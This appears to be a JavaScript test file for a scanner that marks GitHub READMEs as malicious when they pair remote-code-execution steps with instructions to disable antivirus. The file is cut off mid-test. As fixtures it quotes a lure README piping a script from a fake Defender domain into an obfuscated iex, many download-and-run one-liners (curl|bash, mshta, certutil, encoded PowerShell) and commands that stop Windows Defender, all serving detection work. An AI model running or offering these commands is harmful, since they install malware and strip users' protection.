import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  classifyReadme, createReadmeScanner, fetchOwnerCreatedAt, fetchReadme, readmeTraits, NEW_ACCOUNT_DAYS, RULE_VERSION,
} from '../src/services/readme-scan.js';

// 2026-11-09 공개 피드에서 확인한 군집 README의 핵심 구간(research/readmes/TrackerMonarch_rufus.md).
const CLUSTER_README = `# Rufus
**This repository provides a pre-activated, free setup for Rufus.**
1. Open Terminal as Administrator:
   \`\`\`cmd
   irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
   \`\`\`
### 🛡️ Antivirus / SmartScreen Warnings
Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.`;

test('원격 스크립트 실행 지시와 실시간 보호 중지 안내가 함께 있으면 malicious이고 두 줄을 근거로 남긴다', () => {
  const result = classifyReadme(CLUSTER_README);
  assert.equal(result.verdict, 'malicious');
  assert.match(result.evidence, /irm https:\/\/windows-defender\.cc\/updater\/Fix\.ps1/);
  assert.match(result.evidence, /pause "Real-time protection"/);
  assert.ok(result.evidence.length <= 500);
});

test('Invoke-Expression·DownloadString 변형과 Defender 끄기 안내 조합도 malicious다', () => {
  const text = [
    'Run: iex (New-Object Net.WebClient).DownloadString("https://x.example/a.ps1")',
    'Before installing, turn off Windows Defender.',
  ].join('\n');
  assert.equal(classifyReadme(text).verdict, 'malicious');
  assert.equal(classifyReadme('Set-MpPreference -DisableRealtimeMonitoring $true\ncurl -fsSL https://x.example/i.sh | bash').verdict, 'malicious');
});

test('정상 원격 설치 명령만 있으면 clean이다', () => {
  for (const text of [
    'irm https://get.scoop.sh | iex',
    'powershell -c "irm https://astral.sh/uv/install.ps1 | iex"',
    'curl -fsSL https://bun.sh/install | bash',
    '- [herdr](https://herdr.dev) (`curl -fsSL https://herdr.dev/install.sh | sh`)',
  ]) {
    assert.equal(classifyReadme(text).verdict, 'clean', text);
  }
});

test('백신 끄기 안내만 있거나 예외 등록·SmartScreen 안내와 원격 실행이 함께 있어도 clean이다', () => {
  assert.equal(classifyReadme('If blocked, pause Real-time protection and run setup.exe').verdict, 'clean');
  assert.equal(classifyReadme([
    'irm https://example.dev/install.ps1 | iex',
    'Restore the files from Windows Security\'s Protection history, or add `%LOCALAPPDATA%\\App` to its exclusions',
  ].join('\n')).verdict, 'clean');
  assert.equal(classifyReadme([
    'irm https://example.dev/install.ps1 | iex',
    'If SmartScreen appears, click "More info" → "Run anyway".',
  ].join('\n')).verdict, 'clean');
});

test('README가 없거나 비어 있으면 clean이다', () => {
  assert.deepEqual(classifyReadme(null), { verdict: 'clean', evidence: null });
  assert.deepEqual(classifyReadme(''), { verdict: 'clean', evidence: null });
});

test('fetchReadme는 getReadme raw만 호출하고 404는 null, 그 밖의 오류는 던진다', async () => {
  const calls = [];
  const octokit = (impl) => ({ rest: { repos: { getReadme: async (options) => { calls.push(options); return impl(); } } } });
  assert.equal(await fetchReadme(octokit(() => ({ data: '# hi' })), 'o', 'r'), '# hi');
  assert.deepEqual(calls[0], { owner: 'o', repo: 'r', mediaType: { format: 'raw' } });
  assert.equal(await fetchReadme(octokit(() => { throw Object.assign(new Error('nf'), { status: 404 }); }), 'o', 'r'), null);
  await assert.rejects(fetchReadme(octokit(() => { throw Object.assign(new Error('boom'), { status: 502 }); }), 'o', 'r'), /boom/);
});

const PUSHED = '2026-11-08T08:40:39Z';
const SCANNED = new Date('2026-11-09T06:00:00Z');

function scanner({ existing = [], readmes = {}, owners = {}, refreshClusters = async () => 0, minIntervalMs = 100 } = {}) {
  const saved = [];
  const fetched = [];
  const ownerCalls = [];
  const warnings = [];
  const model = {
    findVerdicts: async (ids) => new Map(existing.filter((row) => ids.includes(row.github_id)).map((row) => [row.github_id, row])),
    upsertVerdict: async (row) => { saved.push(row); },
    refreshClusters,
  };
  const instance = createReadmeScanner({
    model,
    fetchReadme: async (octokit, owner, name) => {
      fetched.push(`${owner}/${name}`);
      const value = readmes[`${owner}/${name}`];
      if (value instanceof Error) throw value;
      return value ?? null;
    },
    fetchOwnerCreatedAt: async (octokit, login) => {
      ownerCalls.push(login);
      const value = owners[login];
      if (value instanceof Error) throw value;
      if (!(value instanceof Date)) throw new Error(`unexpected owner lookup ${login}`);
      return value;
    },
    log: { warn: (message) => warnings.push(message) },
    now: () => SCANNED,
    minIntervalMs,
  });
  return { instance, saved, fetched, ownerCalls, warnings };
}

test('판정이 없는 저장소를 검사해 판정·규칙 버전·push 시각·검사 시각을 저장하고 중복 github_id는 한 번만 검사한다', async () => {
  const { instance, saved, fetched } = scanner({ readmes: { 'bad/rufus': CLUSTER_README, 'ok/tool': '# tool' } });
  const result = await instance.scanRepos({}, [
    { github_id: 1, owner: 'bad', name: 'rufus', pushed_at: PUSHED },
    { github_id: 1, owner: 'bad', name: 'rufus', pushed_at: PUSHED },
    { github_id: 2, owner: 'ok', name: 'tool', pushed_at: PUSHED },
  ]);
  assert.deepEqual(result, { scanned: 2, malicious: 1, unknown: 0, skipped: 0, cluster_hidden: 0 });
  assert.deepEqual(fetched.sort(), ['bad/rufus', 'ok/tool']);
  const bad = saved.find((row) => row.github_id === 1);
  assert.equal(bad.verdict, 'malicious');
  assert.equal(bad.rule_version, RULE_VERSION);
  assert.equal(bad.repo_pushed_at.toISOString(), '2026-11-08T08:40:39.000Z');
  assert.equal(bad.scanned_at.toISOString(), SCANNED.toISOString());
  assert.equal(saved.find((row) => row.github_id === 2).verdict, 'clean');
});

test('같은 규칙·같은 push 시각이면 건너뛰고, unknown·규칙 버전 변경·push 변경이면 다시 검사한다', async () => {
  const same = { verdict: 'malicious', rule_version: RULE_VERSION, repo_pushed_at: new Date(PUSHED) };
  const { instance, fetched, saved } = scanner({
    existing: [
      { github_id: 1, ...same },
      { github_id: 2, ...same, verdict: 'unknown', repo_pushed_at: null },
      { github_id: 3, ...same, rule_version: RULE_VERSION - 1 },
      { github_id: 4, ...same },
    ],
    readmes: { 'o/b': '# fine', 'o/c': '# fine', 'o/d': '# cleaned up' },
  });
  const result = await instance.scanRepos({}, [
    { github_id: 1, owner: 'o', name: 'a', pushed_at: PUSHED },
    { github_id: 2, owner: 'o', name: 'b', pushed_at: PUSHED },
    { github_id: 3, owner: 'o', name: 'c', pushed_at: PUSHED },
    { github_id: 4, owner: 'o', name: 'd', pushed_at: '2026-11-09T01:00:00Z' },
  ]);
  assert.deepEqual(result, { scanned: 3, malicious: 0, unknown: 0, skipped: 1, cluster_hidden: 0 });
  assert.deepEqual(fetched.sort(), ['o/b', 'o/c', 'o/d']);
  // 내용이 바뀐 malicious 저장소가 재검사에서 clean이면 판정이 해제된다(R1.4).
  assert.equal(saved.find((row) => row.github_id === 4).verdict, 'clean');
});

test('조회 실패: 판정이 없던 저장소는 unknown으로 저장하고, 기존 판정은 유지하며, 로그에 오류 원문을 남기지 않는다', async () => {
  const failure = Object.assign(new Error('Bad credentials token=ghp_secret'), { status: 503 });
  const { instance, saved, warnings } = scanner({
    existing: [{ github_id: 9, verdict: 'malicious', rule_version: RULE_VERSION, repo_pushed_at: new Date(PUSHED) }],
    readmes: { 'o/new': failure, 'o/known': failure },
  });
  const result = await instance.scanRepos({}, [
    { github_id: 8, owner: 'o', name: 'new', pushed_at: PUSHED },
    { github_id: 9, owner: 'o', name: 'known', pushed_at: '2026-11-09T02:00:00Z' },
  ]);
  assert.deepEqual(result, { scanned: 0, malicious: 0, unknown: 1, skipped: 0, cluster_hidden: 0 });
  assert.deepEqual(saved, [{
    github_id: 8, verdict: 'unknown', rule_version: RULE_VERSION, evidence: null, repo_pushed_at: null, scanned_at: SCANNED,
  }]);
  assert.equal(warnings.length, 2);
  for (const message of warnings) {
    assert.match(message, /status=503/);
    assert.doesNotMatch(message, /ghp_secret|Bad credentials/);
  }
});

test('보호 기능 자체 해제가 아닌 안내(부정문·알림 끄기·예외 등록)는 원격 설치와 함께 있어도 clean이다', () => {
  const install = 'irm https://get.scoop.sh | iex';
  for (const guidance of [
    'Never disable Windows Defender.',
    'Turn off notifications in Windows Security.',
    'Disable scanning of this folder by adding it to Windows Defender exclusions.',
    'Disable Windows Defender for this folder by adding an exclusion.',
  ]) {
    assert.equal(classifyReadme(`${install}\n${guidance}`).verdict, 'clean', guidance);
  }
});

test('파이프 이어쓰기와 문단 안 줄바꿈으로 나눠도 두 신호를 찾고, 표 셀이나 로컬 파일 실행은 원격 실행으로 보지 않는다', () => {
  assert.equal(classifyReadme('irm https://example.invalid/install.ps1 |\n  iex\nDisable Windows Defender.').verdict, 'malicious');
  assert.equal(classifyReadme('irm https://example.invalid/install.ps1 | iex\nBefore setup, disable\nWindows Defender.').verdict, 'malicious');
  assert.equal(classifyReadme('| curl https://example.invalid/a | sh helper |\nDisable Windows Defender.').verdict, 'clean');
  assert.equal(classifyReadme('curl ./install.sh | bash\nDisable Windows Defender.').verdict, 'clean');
  assert.equal(classifyReadme('Command | Shell\n--- | ---\ncurl https://example.invalid/a | sh helper\n\nDisable Windows Defender.').verdict, 'clean');
  assert.equal(classifyReadme('```powershell\nirm https://example.invalid/install.ps1 `\n  | iex |\n  Out-Null\n```\nDisable Windows Defender.').verdict, 'malicious');
  assert.equal(classifyReadme('curl https://example.invalid/install.sh | ba\\\nsh\nDisable Windows Defender.').verdict, 'malicious');
  assert.equal(classifyReadme('---\nirm https://example.invalid/install.ps1 | iex\nDisable Windows Defender.').verdict, 'malicious');
});

test('강조된 부정문·부속 대상 끄기·파일명 속 마침표·목록 항목 경계를 구분한다', () => {
  const install = 'irm https://get.scoop.sh | iex';
  assert.equal(classifyReadme(`${install}\n**Never** disable Windows Defender.`).verdict, 'clean');
  assert.equal(classifyReadme(`${install}\nDisable Windows Defender notifications.`).verdict, 'clean');
  assert.equal(classifyReadme(`${install}\nDisable Windows Defender for setup.exe by adding an exclusion.`).verdict, 'clean');
  assert.equal(classifyReadme(`${install}\n- Add a firewall exception\n- Disable Windows Defender`).verdict, 'malicious');
  assert.equal(classifyReadme(`${install}\nDisable Windows Defender; warnings may still appear until you reboot.`).verdict, 'malicious');
});

test('빈 줄 없이 표 뒤에 이어진 제목·목록의 명령도 검사하고, 짧은 문장이 아주 많아도 실패하지 않는다', () => {
  assert.equal(classifyReadme(
    '| Platform | Supported |\n| --- | --- |\n| Windows | Yes |\n## Installation\n1. Run irm https://example.invalid/install.ps1 | iex\n2. Disable Windows Defender.',
  ).verdict, 'malicious');
  const many = `irm https://example.invalid/install.ps1 | iex\n${'OK. '.repeat(128_000)}Disable Windows Defender.`;
  assert.ok(Buffer.byteLength(many) < 512 * 1024);
  assert.equal(classifyReadme(many).verdict, 'malicious');
});

test('512KB 상한 크기의 반복 토큰 입력도 선형 시간에 판정한다', () => {
  for (const text of [
    'curl '.repeat(100_000),
    `${'irm '.repeat(50_000)}| ${'x'.repeat(200_000)}`,
    `disable ${'windows '.repeat(60_000)}`,
    `${'a-'.repeat(250_000)}`,
    `iex${' '.repeat(500_000)}`,
    `irm https://example.invalid/install.ps1 | iex\n${'Defender off '.repeat(40_000)}exclusion`,
    `irm https://example.invalid/install.ps1 | iex\n${'| --- '.repeat(80_000)}`,
  ]) {
    const started = performance.now();
    classifyReadme(text);
    assert.ok(performance.now() - started < 1000, `${text.slice(0, 12)}… took too long`);
  }
});

const EXEC = 'irm https://x.example/a.ps1 | iex';
const OFF = 'If the setup gets blocked, pause "Real-time protection" in Windows Security.';
const encoded = (script) => Buffer.from(script, 'utf16le').toString('base64');
const CODELESS = { language: null, forks: 0, size: 3 };

test('저장 후 실행: 받은 파일을 같은 명령이나 같은 코드블록의 다음 3줄 안에서 실행하면 실행 지시다', () => {
  for (const command of [
    // 2026-11-09 조사에서 군집이 실행 정책 우회용으로 안내한 형태.
    'curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1',
    'curl -fsSLo setup.sh https://x.example/setup.sh; sudo bash setup.sh',
    'iwr https://x.example/a.ps1 -OutFile $env:TEMP\\a.ps1; & $env:TEMP\\a.ps1',
    '```\nwget https://x.example/tool/install.sh\nchmod +x install.sh\n./install.sh\n```',
    '```\ncertutil -urlcache -split -f https://x.example/s.exe s.exe\nstart s.exe\n```',
    "(New-Object Net.WebClient).DownloadFile('https://x.example/u.exe','u.exe'); Start-Process u.exe",
  ]) {
    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'malicious', command);
    assert.equal(classifyReadme(command).verdict, 'clean', `${command} (실행 지시만)`);
  }
});

test('저장만 하거나, 다른 파일을 실행하거나, 실행이 4줄 이상 떨어지거나 다른 코드블록이면 실행 지시가 아니다', () => {
  for (const command of [
    'curl -o notes.txt https://x.example/notes.txt && cat notes.txt',
    'curl -o a.sh https://x.example/a.sh && bash b.sh',
    '```\ncurl -o a.sh https://x.example/a.sh\necho 1\necho 2\necho 3\nbash a.sh\n```',
    '```\ncurl -o a.sh https://x.example/a.sh\n```\nThen review the script.\n```\nbash a.sh\n```',
    'curl -o a.sh ./local/a.sh && bash a.sh',
  ]) {
    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'clean', command);
  }
});

test('치환·scriptblock·mshta로 받은 내용을 바로 실행하면 실행 지시다', () => {
  for (const command of [
    'bash <(curl -s https://x.example/i.sh)',
    'sh -c "$(curl -fsSL https://x.example/i.sh)"',
    '& ([scriptblock]::Create((irm https://x.example/a.ps1)))',
    'iex "& { $(irm https://x.example/a.ps1) }"',
    'mshta https://x.example/a.hta',
  ]) {
    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'malicious', command);
    assert.equal(classifyReadme(command).verdict, 'clean', `${command} (실행 지시만)`);
  }
  assert.equal(classifyReadme(`bash <(cat ./local.sh)\n${OFF}`).verdict, 'clean');
});

test('인코딩 명령은 풀린 본문에 신호가 있을 때만 인정한다', () => {
  const both = encoded('Set-MpPreference -DisableRealtimeMonitoring $true; irm https://x.example/a.ps1 | iex');
  const result = classifyReadme(`powershell -NoP -W Hidden -enc ${both}`);
  assert.equal(result.verdict, 'malicious');
  assert.match(result.evidence, /irm https:\/\/x\.example\/a\.ps1 \| iex/);
  assert.equal(classifyReadme(`pwsh -EncodedCommand ${encoded(EXEC)}\n${OFF}`).verdict, 'malicious');
  assert.equal(classifyReadme(`pwsh -EncodedCommand ${encoded(EXEC)}`).verdict, 'clean');
  assert.equal(classifyReadme(`powershell -enc ${encoded('Write-Host "setup finished successfully"')}\n${OFF}`).verdict, 'clean');
  assert.equal(classifyReadme(`powershell -enc ${Buffer.from('\u0001\u0002\u0003\u0004'.repeat(20), 'latin1').toString('base64')}\n${OFF}`).verdict, 'clean');
  assert.equal(classifyReadme(`powershell -enc not-base64-at-all!!\n${OFF}`).verdict, 'clean');
});

test('Defender를 끄는 명령은 보호 해제 안내이고, 값을 0으로 쓰거나 부정문이면 아니다', () => {
  for (const off of [
    'sc stop WinDefend',
    'Stop-Service -Name WinDefend -Force',
    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
    'Set-MpPreference -DisableRealtimeMonitoring 1',
  ]) {
    assert.equal(classifyReadme(`${EXEC}\n${off}`).verdict, 'malicious', off);
    assert.equal(classifyReadme(off).verdict, 'clean', `${off} (보호 해제만)`);
  }
  assert.equal(classifyReadme(`${EXEC}\nreg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f`).verdict, 'clean');
  assert.equal(classifyReadme(`${EXEC}\nDo not run sc stop WinDefend.`).verdict, 'clean');
});

test('보호 대상을 일반 명사로 쓴 문구는 코드 없는 저장소 메타가 있을 때만 보호 해제 안내다', () => {
  const FENCED = `\`\`\`\n${EXEC}\n\`\`\`\n`;
  for (const off of [
    'Temporarily disable your security software before running.',
    'Turn off your firewall first.',
  ]) {
    const text = `${FENCED}${off}`;
    assert.equal(classifyReadme(text, CODELESS).verdict, 'malicious', off);
    assert.equal(classifyReadme(text).verdict, 'clean', `${off} (메타 없음)`);
    assert.equal(classifyReadme(text, { ...CODELESS, language: 'Python' }).verdict, 'clean', `${off} (language 있음)`);
    assert.equal(classifyReadme(text, { ...CODELESS, forks: 2 }).verdict, 'clean', `${off} (forks 있음)`);
    assert.equal(classifyReadme(text, { ...CODELESS, size: 5000 }).verdict, 'clean', `${off} (큰 저장소)`);
    assert.equal(classifyReadme(text, { language: null, forks: 0 }).verdict, 'clean', `${off} (size 없음)`);
    assert.equal(classifyReadme(text, { language: null, forks: false, size: 3 }).verdict, 'clean', `${off} (forks가 숫자가 아님)`);
    assert.equal(classifyReadme(text, { language: null, forks: 0, size: '3' }).verdict, 'clean', `${off} (size가 숫자가 아님)`);
    assert.equal(classifyReadme(off, CODELESS).verdict, 'clean', `${off} (보호 해제만)`);
  }
  // 코드 없는 저장소라는 사실만으로는 숨기지 않는다(D-010).
  assert.equal(classifyReadme(EXEC, CODELESS).verdict, 'clean');
  assert.equal(classifyReadme(`${FENCED}Do not disable your security software.`, CODELESS).verdict, 'clean');
  // 일반 명사 문구는 문장 어디에든 부정·금지·조건 표현이나 부속 대상이 있거나, 끄라는 말로 시작하는 문장이 아니면 지시로 보지 않는다.
  for (const guidance of [
    'It is unnecessary to disable the firewall.',
    'Do not, under any circumstances, disable your security software.',
    "You don't have to turn off your firewall.",
    'You can disable the firewall.',
    'If it fails, disable the firewall.',
    'Some users disable the firewall.',
    'The property is named Disable firewall, and its value defaults to false.',
    'The audit log records attempts to disable security software.',
    'Disable firewall and security software notifications only.',
    'Disable firewall and branch protection simulations in the test harness.',
  ]) {
    assert.equal(classifyReadme(`${FENCED}${guidance}`, CODELESS).verdict, 'clean', guidance);
  }
  for (const off of ['1. Please disable the firewall.', 'First, turn off your firewall.', 'You must disable your security software to continue.']) {
    assert.equal(classifyReadme(`${FENCED}${off}`, CODELESS).verdict, 'malicious', off);
  }
  // 방화벽·보호라는 낱말이 다른 대상을 가리키거나 상태를 설명하는 문장은 지시가 아니다.
  const fenced = `\`\`\`\n${EXEC}\n\`\`\`\n`;
  for (const guidance of [
    'Turn off branch protection before force pushing.',
    'Turn off the firewall rule for port 8080 after testing.',
    'Disable the firewall logging verbosity if the output is noisy.',
    'Stop the firewall service container with `docker compose down` when done.',
    'If the firewall is off, the health check prints a warning.',
    'Turn off AV sync in the audio/video settings if playback stutters.',
    'Disable all protection rules on the test branch, then re-enable them.',
    'Protection should be disabled before setup.',
    'Your protection is paused until the license is renewed.',
  ]) {
    assert.equal(classifyReadme(`${fenced}${guidance}`, CODELESS).verdict, 'clean', guidance);
  }
});

test('스캐너는 저장소 메타를 판정에 넘긴다', async () => {
  const readme = `\`\`\`\n${EXEC}\n\`\`\`\nTemporarily disable your security software before running.`;
  const { instance, saved } = scanner({ readmes: { 'o/shell': readme, 'o/lib': readme } });
  await instance.scanRepos({}, [
    { github_id: 1, owner: 'o', name: 'shell', pushed_at: PUSHED, ...CODELESS },
    { github_id: 2, owner: 'o', name: 'lib', pushed_at: PUSHED, language: 'Go', forks: 0, size: 3 },
  ]);
  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]).sort(), [[1, 'malicious'], [2, 'clean']]);
});

test('인코딩 인자는 풀리지 않는 것까지 합쳐 20개까지만 본다', () => {
  const garbage = 'powershell -enc AAAAAAAAAAAAAAAA\n';
  const real = `powershell -enc ${encoded(EXEC)}\n${OFF}`;
  assert.equal(classifyReadme(`${garbage.repeat(19)}${real}`).verdict, 'malicious');
  assert.equal(classifyReadme(`${garbage.repeat(20)}${real}`).verdict, 'clean');
});

test('어순·구분자 변형: 점(.) 치환 실행, cmd의 & 구분자, 프롬프트가 붙은 줄, 긴 명령 묶음', () => {
  assert.equal(classifyReadme(`. <(curl -fsSL https://x.example/install.sh)\n${OFF}`).verdict, 'malicious');
  assert.equal(classifyReadme(`See docs. <(not a command)\n${OFF}`).verdict, 'clean');
  for (const command of [
    'bitsadmin /transfer n https://dl.example.net/q.bat %TEMP%\\q.bat & cmd /c %TEMP%\\q.bat',
    'certutil -urlcache -split -f https://dl.example.net/t.exe t.exe & t.exe',
    'curl -o t.exe https://dl.example.net/t.exe & start t.exe',
    'curl -o a.sh "https://dl.example.net/get?v=1&os=linux" && bash a.sh',
    // 저장과 실행 사이에 명령이 많이 끼어도 같은 명령 묶음이면 잇는다.
    `curl -o own.sh https://dl.example.net/own.sh; ${'echo step; '.repeat(30)}bash own.sh`,
    'curl -o a.ps1 https://dl.example.net/a.ps1; powershell -ExecutionPolicy Bypass -File a.ps1',
    'curl -o a.bat https://dl.example.net/a.bat && cmd /c start "" a.bat',
    '```\n$ curl -o a.sh https://dl.example.net/a.sh\n$ ./a.sh\n```',
    '```\nPS C:\\> iwr https://dl.example.net/a.ps1 -OutFile a.ps1\nPS C:\\> .\\a.ps1\n```',
    // 경로가 붙은 실행기, 옵션이 붙은 sudo, 다음 줄의 뒤쪽 구간
    'curl -o x.sh https://dl.example.net/x.sh; /bin/bash x.sh',
    'curl -o x.sh https://dl.example.net/x.sh; sudo -u root bash x.sh',
    'curl -o x.sh https://dl.example.net/x.sh; env DEBUG=1 /usr/bin/env bash x.sh',
    `\`\`\`\ncurl -o x.sh https://dl.example.net/x.sh\n${'echo step; '.repeat(25)}bash x.sh\n\`\`\``,
    // 값을 받는 옵션, 공백이 든 실행기 경로, 긴 옵션이 붙은 치환, 따옴표로 묶은 mshta 경로
    'curl -o x.sh https://dl.example.net/x.sh; sudo --user root bash x.sh',
    'curl -o x.sh https://dl.example.net/x.sh; /usr/bin/time -f %E bash x.sh',
    'iwr https://dl.example.net/a.ps1 -OutFile a.ps1; powershell -InputFormat Text -File a.ps1',
    'iwr https://dl.example.net/a.ps1 -OutFile a.ps1; & "C:\\Program Files\\PowerShell\\7\\pwsh.exe" -File a.ps1',
    'bash --noprofile --norc <(curl -fsSL https://dl.example.net/i.sh)',
    '"C:\\Windows\\System32\\mshta.exe" https://dl.example.net/i.hta',
    '$block = [scriptblock]::Create((irm https://dl.example.net/i.ps1)); & $block',
    '[scriptblock]::Create((irm https://dl.example.net/i.ps1)).Invoke()',
    'Invoke-Command -ScriptBlock ([scriptblock]::Create((irm https://dl.example.net/i.ps1)))',
    '```\n$b = [scriptblock]::Create((irm https://dl.example.net/i.ps1))\n& $b\n```',
    '```\n$b = [scriptblock]::Create((irm https://dl.example.net/i.ps1))\n$b.Invoke()\n```',
    // 실행하지 않는 말이 파이프의 첫 단계일 뿐이면 뒤 단계는 실행이다(1판과 같은 판정).
    'Write-Output ready | irm https://dl.example.net/i.ps1 | iex',
    'curl -o a.sh https://dl.example.net/a.sh; echo yes | bash a.sh',
    // 실행기에 넘긴 명령 문자열 안의 저장 후 실행, 호출 연산자 뒤 긴 공백
    'bash -c "curl -o a.sh https://dl.example.net/a.sh; bash a.sh"',
    'powershell -Command "iwr https://dl.example.net/a.ps1 -OutFile a.ps1; & .\\a.ps1"',
    'cmd /c "curl -o a.bat https://dl.example.net/a.bat && a.bat"',
    `&${' '.repeat(40)}([scriptblock]::Create((irm https://dl.example.net/a.ps1)))`,
  ]) {
    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'malicious', command);
  }
});

test('받은 파일을 실행하지 않고 읽거나 출력만 하는 명령은 저장 후 실행이 아니다', () => {
  for (const command of [
    'curl -o report.json https://events.example.org/report.json; python -m json.tool report.json',
    'curl -o own.sh https://dl.example.net/own.sh; echo bash own.sh',
    'curl -o notes.txt https://dl.example.net/notes.txt; powershell -Command Get-Content notes.txt',
    'curl -o a.sh https://dl.example.net/a.sh; cat a.sh',
    'curl -o data.csv https://dl.example.net/data.csv && python3 analyze.py data.csv',
    // 내려받기 명령을 출력만 하고 로컬 파일을 실행
    'echo curl -o x.sh https://dl.example.net/x.sh; bash x.sh',
    'printf "curl -o x.sh https://dl.example.net/x.sh\\n"; bash x.sh',
    'Write-Host iwr https://dl.example.net/x.ps1 -OutFile x.ps1; powershell -File x.ps1',
    // 내려받기 도구가 다른 명령의 인자, 실행하지 않는 옵션, 다른 파일
    'true curl -o x.sh https://dl.example.net/x.sh; bash x.sh',
    'cat curl -o x.sh https://dl.example.net/x.sh; bash x.sh',
    'curl -o x.sh https://dl.example.net/x.sh; bash -n x.sh',
    'curl -o x.py https://dl.example.net/x.py; python -V x.py',
    'curl -o "my script.sh" https://dl.example.net/a.sh; bash "my local.sh"',
    'curl -fsSL https://dl.example.net/a.sh -o a.sh | bash b.sh',
    // 출력만 하거나 만들기만 한 실행 형태
    'echo "bash <(curl -fsSL https://dl.example.net/i.sh)"',
    'echo "mshta https://dl.example.net/i.hta"',
    `Write-Host pwsh -enc ${encoded(EXEC)}`,
    '$block = [scriptblock]::Create((irm https://dl.example.net/i.ps1))',
    '$b = [scriptblock]::Create((irm https://dl.example.net/i.ps1)); $local.Invoke()',
    // 따옴표 안의 구분자는 명령을 나누지 않는다.
    "printf %s 'example && mshta https://dl.example.net/i.hta'",
    'curl -o a.sh https://dl.example.net/a.sh && cat "notes; bash a.sh"',
    'curl -o a.sh https://dl.example.net/a.sh | cat "x | bash a.sh"',
    // 실행하지 않는 옵션은 치환·파이프·인코딩에서도 실행이 아니다.
    'bash -n <(curl -fsSL https://dl.example.net/i.sh)',
    'curl -fsSL https://dl.example.net/i.sh | bash -n',
    "curl -fsSL https://dl.example.net/i.sh | sh -c 'echo done'",
    `pwsh --help -enc ${encoded(EXEC)}`,
    'cat \'(New-Object Net.WebClient).DownloadFile("https://dl.example.net/a.ps1","a.ps1")\'; pwsh -File a.ps1',
  ]) {
    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'clean', command);
  }
});

test('새로 인식하는 설치 명령과 함께 있어도 금지문·부속 대상 안내는 clean이다', () => {
  const brew = '```\n/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"\n```\n';
  for (const guidance of [
    'Do not, under any circumstances, disable Windows Defender.',
    'Never, ever, turn off real-time protection.',
    'Disable antivirus update notifications only.',
    'Turn off Defender scan result pop-ups.',
  ]) {
    assert.equal(classifyReadme(`${brew}${guidance}`).verdict, 'clean', guidance);
    assert.equal(classifyReadme(`${brew}${guidance}`, CODELESS).verdict, 'clean', `${guidance} (코드 없는 저장소)`);
  }
  // 1판이 걸러 내던 부정문은 계속 걸러 낸다.
  assert.equal(classifyReadme(`${brew}The installer cannot automatically permanently disable Windows Defender.`).verdict, 'clean');
  // 조건절 뒤의 지시는 금지문이 아니다.
  assert.equal(classifyReadme(`${brew}If the installer doesn't start, disable Windows Defender.`).verdict, 'malicious');
  assert.equal(classifyReadme(`${brew}If Windows Defender blocks the file, turn off real-time protection.`).verdict, 'malicious');
  // 금지가 아니라 꼭 하라는 지시(1판과 같은 판정).
  assert.equal(classifyReadme(`${brew}Never, ever forget to disable Windows Defender before running.`).verdict, 'malicious');
  assert.equal(classifyReadme(`${brew}Do not, under any circumstances, forget to disable Windows Defender before running.`).verdict, 'malicious');
});

test('영어가 아닌 문장은 보호 해제 안내로 읽지 않는다(부정·금지 표현을 가려낼 수 없어 2판에서 뺌)', () => {
  const install = '```\ncurl -fsSL https://get.example.org/i.sh | bash\n```\n';
  for (const guidance of [
    '설치 전에 Windows Defender 실시간 보호를 꺼 주세요.', '백신 프로그램을 잠시 비활성화한 뒤 실행하세요.',
    '运行前请关闭杀毒软件和实时保护。', 'Перед установкой отключите антивирус.',
    'Desactiva temporalmente el antivirus antes de instalar.', 'Desative o antivírus antes de executar.',
    '백신을 비활성화하면 안 됩니다.', '백신을 끄기보다는 설치 로그를 먼저 확인하세요.',
    '禁止关闭杀毒软件。', '不应关闭实时保护。', 'Нельзя отключать антивирус для работы приложения.',
    'Desactivar el antivirus no es necesario para usar este programa.', 'É proibido desabilitar o antivírus para usar esta ferramenta.',
    'Desactiva la ventana de Defender al minimizar; la protección sigue activa.',
    // 부정
    '백신을 끄면 안 됩니다.', '백신은 안 꺼도 됩니다.', '실시간 보호를 굳이 끄실 필요까지는 전혀 없습니다.',
    '本项目不会禁用 Defender。', '本工具不会关闭杀毒软件。', '我们没有关闭实时保护。', '无须关闭杀毒软件。', '不建议关闭杀毒软件。',
    'Отключать антивирус не требуется.', 'Funciona sin desactivar el antivirus.', 'Nunca desactives el antivirus.',
    'Funciona sem desativar o antivírus.', 'Nunca desative o antivírus.',
    // 낱말 일부가 겹치거나 다른 대상을 가리킴
    '백신으로 검사한 뒤 압축을 해제하세요.', '매끄러운 설치를 위해 백신 검사를 통과한 서명 바이너리를 제공합니다.',
    '부끄럽지만 아직 백신 인증은 받지 못했습니다.', '백신 프로그램이 설치 파일을 꺼림칙하게 여길 수 있습니다.',
    '코로나 백신 예약 매크로를 중지하려면 Ctrl+C 를 누르세요.',
    '关闭窗口后杀毒软件会自动扫描下载的文件。', '暂停下载时杀毒软件可能会扫描临时文件',
    // 알림만 끔
    '关闭 Defender 的通知即可。', 'Отключите уведомления защитника.', 'Desactiva las notificaciones de Defender.',
    'Desative as notificações do antivírus.',
  ]) {
    assert.equal(classifyReadme(`${install}${guidance}`).verdict, 'clean', guidance);
    assert.equal(classifyReadme(`${install}${guidance}`, CODELESS).verdict, 'clean', `${guidance} (코드 없는 저장소)`);
  }
});


test('저장 명령·인코딩 인자가 아주 많이 반복돼도 선형 시간에 판정한다', () => {
  for (const text of [
    'curl -o a http://x.yy/z && '.repeat(18_000),
    `[scriptblock]::create((irm https://e.com/x)) & ${' '.repeat(500_000)}x`,
    'curl -o a http://x.yy/z\n'.repeat(20_000),
    Array.from({ length: 15_000 }, (_, i) => `curl -o f${i}.sh http://x.yy/f${i}.sh`).join('\n'),
    `powershell -enc ${'A'.repeat(480_000)}`,
